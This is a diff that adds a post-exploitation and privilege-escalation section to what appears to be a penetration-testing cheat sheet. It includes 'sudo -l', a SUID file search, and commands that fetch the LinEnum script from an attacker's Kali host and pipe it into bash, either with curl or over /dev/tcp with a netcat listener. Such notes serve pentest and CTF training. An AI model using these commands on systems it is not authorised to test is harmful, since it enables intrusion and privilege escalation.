@@ -153,6 +153,41 @@ THIS ALLOWS YOU TO GO DIRECTLY TO THE IMPORTANT ONES
 EyeWitness --> https://github.com/FortyNorthSecurity/EyeWitness
 
 # POST EXPLOTATION
+## BINARY ABUSE / PRIVILEGE ESCALATION
+FOR EXAMPLE, LOOK FOR SUDO POSIBILITIES WITH THIS USER
+```
+sudo -l
+```
+LOOK FOR THIS COMMANDS IN:
+https://gtfobins.github.io/
+
+## LinEnum
+https://github.com/rebootuser/LinEnum
+TARGET:
+```
+curl <IP_KALI:PORT>/LinEnum.sh | bash
+```
+KALI:
+```
+python -m SimpleHTTPServer PORT --> IN LinEnum.sh PATH (/opt/LinEnum)
+```
+(OPTION 2)
+TARGET:
+```
+bash < /dev/tcp/<IP_KALI>/9001
+```
+KALI:
+```
+nc -lvnp 9001 < LinEnum.sh
+```
+## PSPY (SHOWS SYSTEM EVENTS)
+https://github.com/DominicBreuker/pspy
+
+## FIND INTERESTING FILES WITH USER EXEC PRIVILEGES
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
 ## SHELL
 ### SHELL UPGRADE
 ```
